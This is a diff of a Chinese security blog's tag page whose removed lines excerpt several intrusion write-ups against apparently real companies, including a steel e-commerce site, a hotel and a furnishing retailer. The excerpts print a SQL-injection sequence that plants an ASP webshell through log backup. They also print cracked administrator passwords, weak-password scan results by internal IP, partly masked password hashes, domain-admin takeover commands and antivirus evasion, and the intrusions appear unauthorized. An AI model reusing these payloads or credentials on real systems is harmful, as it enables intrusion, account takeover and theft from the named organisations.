@@ -1,279 +1,270 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Tag: 内网渗透 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Tag: 内网渗透 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Tag: 内网渗透 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="tag-icon">内网渗透</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2015-04-27T06:39:14.000Z" itemprop="datePublished">
-          2015-04-27
-      </time>
-    
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1108.seo/">某内网渗透实例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>1.外网入口:</p>  <p>目标:vlun.com[打码需要]</p>  <p>从m.vlun.com分站入手，发现有一个注入</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001_thumb.png" width="591" height="180" /></a></p>  <p>直接备份一个webshell</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003_thumb.jpg" width="580" height="393" /></a></p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004_thumb.png" width="472" height="257" /></a></p>  <p>接着提权加抓密码的得到:</p>  <p>UserName: Administrator</p>  <p>password: vlun,123【之前的密码，也被抓下来了】</p>  <p>UserName: Administrator</p>  <p>password: vlun,54a【可以发现这个密码和ip有关！】</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>2.<a href="http://ha.cker.in/tag/内网渗透" target="_blank">内网渗透</a>:</p>  <p>2.1. 10.135.106.0/24段</p>  <p>本机在这个段，而且之前密码来看，密码和ip有关，</p>  <p>也就是说假设ip是10.135.106.108，那他的口令一个这样administrator:vlun,108a</p>  <p>So，密码将字典加入凤凰扫描器，开始扫描；</p>  <p>Result:</p>  <p>Mysql:</p>  <p>10.135.106.25 mysql at 3306 has weaken password!!——-root:123456</p>  <p>10.135.106.86 mysql at 3306 has weaken password!!——-root:root</p>  <p>Ssh:</p>  <p>10.135.106.245 ssh at 22 has weaken password!!——-root:vlun,123</p>  <p>Smb:</p>  <p>10.135.106.75 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.160 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.54 smb at 445 has weaken password!!——-administrator:vlun,54a</p>  <p>10.135.106.41 smb at 445 has weaken password!!——-administrator:vlun,41a</p>  <p>10.135.106.180 smb at 445 has weaken password!!——-administrator:vlun,180a</p>  <p>喜欢sock5代理，可以方便的用proxychains和proxifier连接。</p>  <p>想用hdtran做一个sockets代理，结果老给杀掉，直接用python写一个类似功能的，ssock_win.exe 做了sock5代理并反弹出来~</p>  <p>上图：</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006_thumb.jpg" width="580" height="334" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1108.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2014-07-31T14:43:24.000Z" itemprop="datePublished">
-          2014-07-31
-      </time>
-    
-    
-    | 
-    <a href='/tag/meterpreter/'>meterpreter</a>,
-    
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1090.seo/">渗透中国钢铁商城</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>中国钢铁商城 在线交易平台 jboss更新不及时，导致任意文件上传    <br />漏洞页面:     <br /><a href="http://www.steel-mall.com//invoker/JMXInvokerServlet">http://www.steel-mall.com//invoker/JMXInvokerServlet</a> jboss漏洞     <br />直接利用exp(下载地址: <a href="http://buchedan.org/download/jboss-exploit.zip)获得webshell，此过程略。">http://buchedan.org/download/jboss-exploit.zip)获得webshell，此过程略。</a>     <br />可以参考:&#160; <a href="http://www.wooyun.org/bugs/wooyun-2013-031621">WooYun: 中国电信某站点JBOSS任意文件上传漏洞</a>     <br />对于web系统来说，最重要的不是服务器，而是数据库，因此找到数据库配置文件，获得数据库用户名和密码:     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image001.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image001_thumb.jpg" width="522" height="267" /></a><u>      <br /></u>    <br />Oracle数据库。连接数据库     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image002.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image002_thumb.jpg" width="539" height="256" /></a><u>      <br /></u>    <br />直接就是dba权限的，又是一台服务器。     <br />查一下所有表中，有PASS开头的表     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image003_thumb.jpg" width="569" height="313" /></a><u>      <br /></u>    <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image004.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image004_thumb.jpg" width="565" height="232" /></a><u>      <br /></u>    <br />这个名字好像很熟悉。不知道是不是重名，出于好奇，想看看信息。     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image005.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image005_thumb.jpg" width="516" height="286" /></a><u>      <br /></u>    <br />可以破解，使用用户名登录系统。     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image006.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image006_thumb.jpg" width="543" height="457" /></a><u>      <br /></u>    <br />前面就不看了，就看一下钱好了     <br /><u>     <br /></u><a href="http://img.cker.in/8949c1d591df_212E/clip_image007.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="渗透中国钢铁商城" border="0" alt="渗透中国钢铁商城" src="http://img.cker.in/8949c1d591df_212E/clip_image007_thumb.jpg" width="383" height="208" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1090.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1108.seo/" title="某内网渗透实例" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">
-          2012-12-09
-      </time>
+    <h1 itemprop="name">某内网渗透实例</h1>
     
-    
-    | 
-    <a href='/tag/Webshell/'>Webshell</a>,
-    
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/952.seo/">对国外某hotel的内网域渗透案例</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>目录</p>  <p>1网站初探</p>  <p>2通过Sql注入获取webshell</p>  <p>2.1通过Log备份获得webshell</p>  <p>3权限提升</p>  <p>3.1查看服务器基本信息</p>  <p>3.2渗透A域中的机器</p>  <p>4渗透其他域下机器</p>  <p>4.1轻松搞定WORKGROUP下机器</p>  <p>4.2渗透B域下的机器</p>  <p>4.3一波未平一波又起</p>  <p>5截稿</p>  <p>本文将讲述对国外某一hotel的渗透测试，让更多的人安全意识得到提高，有攻才有访，防得在好，也有疏忽的地方，这就是为啥你”老婆”原来是你失散多年的兄妹.</p>  <p>网站初探</p>  <p>本篇由于不是针对性的对目标进行渗透测试, 所以直接寻找网站的常见漏洞进行渗透.灰话不多扯.<ins>(</ins><ins>开启</ins><ins>vpn,</ins><ins>跳到肉鸡</ins><ins>,</ins><ins>嘞次购</ins><ins>.)</ins>    <br />首先了解一下网站的概况,查看网页链接,可以看出是asp.net写的,这里就可以猜测出服务器是windows+iis.使用火狐的Live HTTP headers插件刷的一下就可以看出来了.    <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/%E5%9B%BE%E7%89%871.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="live http header" border="0" alt="clip_image001" src="http://img.cker.in/hotel_13F2D/clip_image001.jpg" width="570" height="370" /></a></p>  <p>通过Sql注入获取<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a></p>  <p>这里漏洞修补了,就不截图了,直接给出方法:   <br /><a href="http://www.pentesting.cc/test.aspx?id=1">http://www.pentesting.cc/test.aspx?id=1</a> AND 1 IN (select @@version)–返回    <br />Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</p>  <p>通过Log备份获得webshell   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="1440">           <p>test.aspx?id=1;alter/<strong>/database/</strong>/[CRSHGC]/<strong>/set/</strong>/recovery/<strong>/full–</p>            <p>test.aspx?id=1;declare/</strong>/@d/<strong>/nvarchar(4000)/</strong>/select/<strong>/@d%3D0x640062006200610063006B00/</strong>/backup/<strong>/database/</strong>/[CRSHGC]/<strong>/to/</strong>/disk%3D@d/<strong>/with/</strong>/init–</p>            <p>test.aspx?id=1;create/<strong>/table/</strong>/<a href="[a]/**/image">pg</a>–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%3D0x640062006200610063006B00/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>            <p>test.aspx?id=1;insert/</strong>/into/<strong>/<a href="[a]">pg</a>/</strong>/values(0x3C25457865637574652872657175657374282272222929253E)–</p>            <p>test.aspx?id=1;declare/<strong>/@d/</strong>/nvarchar(4000)/<strong>/select/</strong>/@d%master.dbo.fn_varbintohexstr(0x44003A005C0049006E00650074007000750062005C0077007700770072006F006F0074005C0078002E00610073007000)/<strong>/backup/</strong>/log/<strong>/[CRSHGC]/</strong>/to/<strong>/disk%3D@d/</strong>/with/<strong>/init–</p>         </td>       </tr>     </tbody></table> </p>  <p>权限提升</p>  <p>先query user看看有在线的木有，如图：   <br /><a href="http://www.pentesting.cc/wp-content/uploads/2012/11/queryuser.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="queryuser" border="0" alt="clip_image002" src="http://img.cker.in/hotel_13F2D/clip_image002.jpg" width="570" height="125" /></a>    <br />如果有管理在线的话，要么赶紧找到提权突破口就闪，要么就先撤了等时机在上，碰到细心的管理员netstat -an一下就可以很快的排查出xxip在连它，把日志一看就把你T飞了。这里经过查看多个web.config（for一下）找到了数据库的sa明文密码,当然你可以通过sql injection获取数据库密码hash进行破解.    <br />在别人的地盘用”自己”的东西是不是好点,一个sa就可以干很多事情了。个人习惯,先上传gethash工具,如: PwDump7 GetHashes都是很不错的选择,抓好丢机子里用彩虹表慢慢跑,前提免杀<ins>(</ins><ins>这里</ins><ins>tasklist</ins><ins>、</ins><ins>net start</ins><ins>、</ins><ins>netstat -an</ins><ins>一下木杀毒，此篇就不扯这了</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Administrator:500:AAD3B435B514-xxoo-435B51404EE:4148523F64-xxoo-27962CFEBB8673:::</p>            <p>ACC*</strong>ER:1120:7630AC7F823B-xxoo-435B51404EE:67C86B3C2C0-xxoo-7EB68485FF298D0::: </p>            <p>gr<strong><em>ral:1135:C1812A18AB-xxoo-AD8EF711268D9:D80B352E1DF-xxoo-08BA668C67901B::: </p>            <p>br</em></strong>ez:3142:397B32F70C9-xxoo-85F02E9B6432A9:3C6DF2F32-xxoo-43EBF3DA543347B16::: </p>            <p>C<strong><em>nt:3143:42490206A91-xxoo-B435B51404EE:59F1886EEA9-xxoo-728AE1EFDF78EC89::: </p>            <p>hm</em></strong>o:3145:0C3F791CC-xxoo-D87772F:4E0AC2608807827-xxoo-21717D800::: </p>            <p>……</p>         </td>       </tr>     </tbody></table> </p>  <p>查看服务器基本信息</p>  <p>ipconfig /all   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Windows IP Configuration</p>            <p>&#160;&#160; Host Name . . . . . . . . . . . . : host1</p>            <p>&#160;&#160; Primary Dns Suffix&#160; . . . . . . . : A.COM</p>            <p>&#160;&#160; Node Type . . . . . . . . . . . . : Unknown</p>            <p>&#160;&#160; IP Routing Enabled. . . . . . . . : No</p>            <p>&#160;&#160; WINS Proxy Enabled. . . . . . . . : No</p>            <p>&#160;&#160; DNS Suffix Search List. . . . . . : A.COM</p>            <p>Ethernet adapter Local Area Connection 2:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet #2</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-xx</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.205</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.202</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.195</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.103</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.13</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.65</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>            <p>Ethernet adapter Local Area Connection:</p>            <p>&#160;&#160; Connection-specific DNS Suffix&#160; . : </p>            <p>&#160;&#160; Description . . . . . . . . . . . : Broadcom NetXtreme Gigabit Ethernet</p>            <p>&#160;&#160; Physical Address. . . . . . . . . : 00-14-85-02-00-x2</p>            <p>&#160;&#160; DHCP Enabled. . . . . . . . . . . : No</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.84</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.83</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.82</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.81</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.80</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; IP Address. . . . . . . . . . . . : 192.168.100.49</p>            <p>&#160;&#160; Subnet Mask . . . . . . . . . . . : 255.255.255.0</p>            <p>&#160;&#160; Default Gateway . . . . . . . . . : 192.168.100.1</p>            <p>&#160;&#160; DNS Servers . . . . . . . . . . . : 192.168.100.201</p>            <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 192.168.100.212</p>         </td>       </tr>     </tbody></table> </p>  <p>从上面就可以看出 是内网并且存在域，不清楚可以用命令net view /domain   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>Domain</p>            <p>——————————————————————————-</p>            <p>B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>WORKGROUP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>            <p>The command completed successfully.</p>         </td>       </tr>     </tbody></table> </p>  <p>渗透A域中的机器</p>  <p>查看A域中都有哪些域成员。<ins>（</ins><ins>IP</ins><ins>直接</ins><ins>ping</ins><ins>下就知道，记录下</ins><ins>TTL</ins><ins>值，猜测系统版本）</ins>    <br />dsquery server -o rdn <ins>(</ins><ins>不清楚的可以</ins><ins>nslookup A.com</ins><ins>或者</ins><ins>net group &quot;domain controllers&quot;</ins><ins>，这些命令在域环境下执行</ins><ins>)</ins>    <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td width="940">           <p>//查找当前域中所有的域控制器</p>            <p>HGhost&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.212 TTL=128</p>            <p>host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.205 TTL=128 本机</p>            <p>HGhost2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //192.168.100.213 TTL=128</p>            <p>host1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //本机</p>         </td>       </tr>     </tbody></table> </p>  <p>可以看出本机为域控制器，那么得到domain admins权限就可以控制A域了，这里经过测试发现domain users权限的用户可以添加domain admins组的用户，直接net group &quot;domain admins&quot; xx /add就可以控制A域了（还是扯下吧，xx用户属于domain users跟administrators组，而administrators组加入了domain admins组 over），这里不建议添加用户之类的.因为这样很容易被发现,导致权限丢失。之前抓的系统hash部分密码用彩虹表破解出来了，我们用这些密码登录A域中的其他机器试试，这里以截图为目的。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/952.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2015-04-27T06:39:14.000Z" itemprop="datePublished">2015-04-27</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-25T05:56:48.000Z" itemprop="datePublished">
-          2012-09-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/内网渗透/'>内网渗透</a>,
-    
-    <a href='/tag/嗅探/'>嗅探</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/852.seo/">对居然之家的一次内网渗透</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>先上图：</p>  <p><a href="http://img.cker.in/89c468c9f1cf_10E52/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/89c468c9f1cf_10E52/clip_image001_thumb.jpg" width="508" height="287" /></a></p>  <p>本来是不想搞站的，专心学点编程，可是老是有人来找我帮忙什么的。。。搞完这个我想专心学点编程，俗话说不会编程的黑客不算是高富帅。。。所以说，你懂得。</p>  <p>进入正题</p>  <p>1. 主站摸索</p>  <p>2. 旁站摸索</p>  <p>3. 旁服摸索</p>  <p>4.</p>  <p>不开玩笑了。。</p>  <p>嫖叔尝试过主站服务器了，但是没有搞下来，我这人比较懒，当时也没有追随着嫖叔的脚步搞那个db权限的注射点，一来好久没搞注入了，二来对注入也无爱了。后来玩命有一天很激动的告诉我说拿到了旁服上的一个shell，叫我提权试试，我想了想，既然这是个企业站，注册资金据说有8100w，肯定很有钱，服务器肯定也是大大的有，放在内网的话还能内网渗透一下，于是就上了。</p>  <p>顺便说下，玩命搞到的那个shell是通过注射加后台上传拿到的，大家就别再搞了。</p>  <p>上了shell看了下，权限很大，几乎全盘浏览了，支持asp，aspx，php，翻了下看见了xampp，管理员还真懒，mysql估计就是系统权限运行的，而且我猜root密码还是默认为空。于是翻查数据库连接文件，管理员果然没让我失望</p>  <p><a href="http://img.cker.in/89c468c9f1cf_10E52/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/89c468c9f1cf_10E52/clip_image002_thumb.jpg" width="508" height="305" /></a></p>  <p>于是果断mysql导出udf提权，加了个系统权限的用户，上了rootki.asp（这玩意用系统帐号登录，权限为system，比较方便）</p>  <p>查了下远程桌面端口发现没改，ipconfig发现是双网卡，但都在内网，装了金山杀毒软件和金山管理软件（不记得是不是这个名字了）</p>  <p>上传lcx想转发端口的，可惜被杀了，试了下taskkill，ntsd都不能把杀毒的进程给杀完，最主要的杀毒进程杀不掉，没办法，找小陈做了个免杀，自己又是外网（怨念哪。。当初花150买了个90块钱的tplink路由器，结果发现不能把自己放到dmz去，端口映射也不行，被黑出翔了，如果我是外网的，可以做更多的事的，反弹到我这里，用metasploit进行内网渗透。。。嘿嘿，留口水了）于是上外网服务器操作了，那慢的叫我想死了。。。不过好歹有个桌面环境给我操作，不用一直命令行了。</p>  <p>既然是内网，当然是要内网搞一搞了，但是之前我在服务器上翻了下，发现了装有winwebmail，这玩意一开始查同服的时候就知道了，只不过貌似限制了ip登录，但是我控制了服务端，不怕限制ip登录，以后可以作为一个信息来源，先留着。</p>  <p>Cmd下执行各种命令对内网环境做一个基本的了解。</p>  <p>C:Documents and Settingsfucker&gt;net view /domain 查看有几个组</p>  <p>Domain————————————————————-</p>  <p>MYGROUP</p>  <p>WORKGROUP</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker桌面Pwdump7&gt;netview（查询有关系的机器）</p>  <p>服务器名称 注释</p>  <p>————————————————————————</p>  <p>EFGP</p>  <p>IBM</p>  <p>IIBM</p>  <p>JR141&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; jr141</p>  <p>JR142</p>  <p>JURANZHIJIALEWU</p>  <p>JURZJCTI-9897F9</p>  <p>LEWU</p>  <p>OASERVER</p>  <p>POS27&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos27</p>  <p>POS28</p>  <p>POS29&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos29</p>  <p>POS30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos30</p>  <p>USER-87C8B53A9C</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker&gt;net view/domain:workgroup（查看workgroup组下的机器）</p>  <p>服务器名称 注释</p>  <p>——————————————————————</p>  <p>EFGP</p>  <p>IBM</p>  <p>JR141&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; jr141</p>  <p>JR142</p>  <p>JURANZHIJIALEWU</p>  <p>JURZJCTI-9897F9</p>  <p>LEWU</p>  <p>OASERVER</p>  <p>POS27&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos27</p>  <p>POS28</p>  <p>POS29&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos29</p>  <p>POS30&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; pos30</p>  <p>命令成功完成。</p>  <p>C:Documents and Settingsfucker&gt;net view/domain:mygroup（查询mygroup组下的机器）</p>  <p>服务器名称 注释</p>  <p>————————————————————————-</p>  <p>AP-3850-3&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Samba Server Version 3.0.33-0.17.el4</p>  <p>GP53&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Samba Server Version 3.0.33-3.28.el5</p>  <p>命令成功完成。-</p>  <p>其实这些东西查询出来</p>
